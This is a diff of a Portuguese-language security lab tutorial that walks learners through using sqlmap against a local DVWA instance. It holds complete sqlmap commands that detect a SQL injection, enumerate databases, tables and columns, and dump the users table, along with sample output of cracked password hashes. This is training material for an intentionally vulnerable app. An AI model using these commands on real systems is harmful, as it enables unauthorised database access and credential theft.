@@ -251,27 +251,20 @@ O **sqlmap** faz tudo isso sozinho. Mas ele precisa se passar por você (logado)
 
 **Alternativa (pela aba Armazenamento):** com o F12 aberto, clique na aba **Armazenamento** (se não aparecer, clique na setinha **`>>`** no fim das abas) → abra **Cookies** → clique em **`http://localhost:8081`** → copie o valor de **`PHPSESSID`** e confirme que há **`security = low`**.
 
-**Rodar o sqlmap (de forma progressiva):**
+**Rodar o sqlmap (um passo de cada vez):**
 
-1. Detectar a injeção:
-   ```
-   sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=SEU_PHPSESSID; security=low" --batch
-   ```
-   *Para que serve:* o sqlmap testa sozinho vários tipos de injeção no parâmetro `id`.
-   *O que esperar:* ele confirma que o `id` é vulnerável (detalhes na simulação de terminal abaixo).
-2. Listar os bancos: adicione `--dbs`
-3. Listar as tabelas do `dvwa`: `-D dvwa --tables`
-4. Listar as colunas da `users`: `-D dvwa -T users --columns`
-5. Extrair só o que importa:
-   ```
-   sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=SEU_PHPSESSID; security=low" --batch -D dvwa -T users -C user,password --dump
-   ```
+A ideia é ir **montando o comando aos poucos**: cada passo pega o comando anterior e **acrescenta parâmetros no final**. Rode tudo **no terminal** do Kali e troque `SEU_PHPSESSID` pelo valor que você pegou no cookie.
 
-**O que cada parte faz:** `-u` = a URL/alvo · `--cookie` = sua sessão · `--batch` = responde "sim" sozinho · `--dbs/-D` = bancos · `--tables/-T` = tabelas · `--columns/-C` = colunas · `--dump` = extrai os dados.
+**O que cada parâmetro significa:** `-u` = a URL/alvo · `--cookie` = sua sessão (logado) · `--batch` = responde as perguntas sozinho · `--dbs` = liste os bancos · `-D` = escolha um banco · `--tables` = liste as tabelas · `-T` = escolha uma tabela · `--columns` = liste as colunas · `-C` = escolha colunas · `--dump` = extraia os dados.
 
-**Entendendo o que aparece no terminal (não se assuste com o monte de texto):**
+---
 
-Quando rodar o 1º comando (detecção), o sqlmap mostra algo assim — você só precisa achar as linhas-chave:
+**Passo 1 — Detectar a injeção.**
+```
+sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=SEU_PHPSESSID; security=low" --batch
+```
+*Para que serve:* o sqlmap acessa a URL e testa sozinho vários tipos de injeção no parâmetro `id`.
+*O que esperar:* bastante texto rolando — não se assuste. Você só precisa achar as **linhas-chave** no meio:
 ```
         ___
        __H__
@@ -280,35 +273,67 @@ Quando rodar o 1º comando (detecção), o sqlmap mostra algo assim — você s�
 |___|_  [.]_|_|_|__,|  _|
       |_|V...       |_|
 
-[*] starting @ 16:50:12 /2026-11-25/
-
 [16:50:12] [INFO] testing connection to the target URL
-[16:50:13] [INFO] testing if GET parameter 'id' is dynamic
 [16:50:13] [INFO] GET parameter 'id' appears to be dynamic
-[16:50:13] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
 [16:50:15] [INFO] GET parameter 'id' is 'AND boolean-based blind' injectable
 [16:50:16] [INFO] GET parameter 'id' is 'MySQL >= 5.0 error-based' injectable
-[16:50:17] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+[16:50:17] [INFO] GET parameter 'id' is 'Generic UNION query (NULL)' injectable
 [16:50:17] [INFO] the back-end DBMS is MySQL
 GET parameter 'id' is vulnerable.
-web application technology: Apache, PHP
 back-end DBMS: MySQL >= 5.0
 ```
-👉 **O que procurar aqui:**
-- A linha **`GET parameter 'id' is vulnerable`** → achou a falha! 🎯
-- As linhas **`Type: boolean-based blind / error-based / UNION query`** → são as técnicas que funcionaram (o sqlmap usa a melhor sozinho).
-- **`back-end DBMS is MySQL`** → ele descobriu o tipo de banco (a partir daqui sabe como extrair).
-- Se aparecer alguma pergunta `[y/N]`, o `--batch` já responde por você — não precisa fazer nada.
+👉 **Procure por:** a linha **`GET parameter 'id' is vulnerable`** (achou a falha! 🎯) e **`back-end DBMS is MySQL`** (descobriu o tipo de banco). As linhas `boolean-based / error-based / UNION query` são as técnicas que funcionaram. Se aparecer uma pergunta `[y/N]`, o `--batch` já responde sozinho.
 
-Quando você adicionar `--dbs`, procure por:
+---
+
+**Passo 2 — Listar os bancos de dados.** Pegue o **mesmo comando do Passo 1** e **acrescente `--dbs`** no fim:
+```
+sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=SEU_PHPSESSID; security=low" --batch --dbs
+```
+*Para que serve:* pedir a **lista de bancos** que existem no servidor.
+*O que esperar:* no fim da saída, um bloco assim:
 ```
 available databases [2]:
 [*] dvwa
 [*] information_schema
 ```
-👉 O **`dvwa`** é o nosso banco (o `information_schema` é o "catálogo" interno do MySQL).
+👉 O **`dvwa`** é o nosso banco (o `information_schema` é o "catálogo" interno do MySQL — pode ignorar).
 
-E o **`--dump`** (o prêmio) mostra a tabela com as credenciais:
+---
+
+**Passo 3 — Listar as tabelas do `dvwa`.** Agora escolha o banco com `-D dvwa` e peça `--tables`:
+```
+sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=SEU_PHPSESSID; security=low" --batch -D dvwa --tables
+```
+*Para que serve:* entrar no banco `dvwa` e listar as **tabelas** dele.
+*O que esperar:*
+```
+Database: dvwa
+[2 tables]
++-----------+
+| guestbook |
+| users     |
++-----------+
+```
+👉 A tabela **`users`** é o alvo.
+
+---
+
+**Passo 4 — Listar as colunas da `users`.** Escolha a tabela com `-T users` e peça `--columns`:
+```
+sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=SEU_PHPSESSID; security=low" --batch -D dvwa -T users --columns
+```
+*Para que serve:* dentro da tabela `users`, listar as **colunas**.
+*O que esperar:* uma lista com `user_id`, `first_name`, `user`, `password`, `avatar`… 👉 as que interessam são **`user`** e **`password`**.
+
+---
+
+**Passo 5 — Extrair as credenciais (o prêmio).** Escolha as colunas com `-C user,password` e peça `--dump`:
+```
+sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=SEU_PHPSESSID; security=low" --batch -D dvwa -T users -C user,password --dump
+```
+*Para que serve:* **extrair** (dump) o conteúdo das colunas `user` e `password`.
+*O que esperar:* a tabela com os usuários e os hashes das senhas:
 ```
 Database: dvwa
 Table: users
@@ -323,11 +348,9 @@ Table: users
 | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
 +---------+---------------------------------------------+
 ```
-👉 **O que procurar aqui:**
-- Cada linha é um **usuário** e o **hash** da senha dele.
-- Repare: o sqlmap até **quebra** os hashes conhecidos e mostra a senha em **parênteses** — ex.: `admin` → `(password)`. (Se ele perguntar "crack them via dictionary-based attack? [Y/n]", é só deixar seguir.)
+👉 Cada linha é um **usuário** e o **hash** da senha dele. O sqlmap até **quebra** os hashes conhecidos e mostra a senha em **parênteses** (ex.: `admin` → `password`). Se ele perguntar "crack them via dictionary-based attack? [Y/n]", é só deixar seguir.
 
-> 💡 **Resumo do que caçar na tela:** `is vulnerable` (achou) → `available databases` (onde está) → a **tabela do `--dump`** (o que você queria). O resto do texto é o sqlmap "pensando" — pode ignorar.
+> 💡 **Resumo:** cada passo é o anterior **+ um parâmetro no fim** → `--batch` (detecta) → `--dbs` (quais bancos) → `-D dvwa --tables` (quais tabelas) → `-D dvwa -T users --columns` (quais colunas) → `-D dvwa -T users -C user,password --dump` (extrai). É sempre essa escada.
 
 ### 2.5 Quebrar o hash (do hash ao texto claro)
 
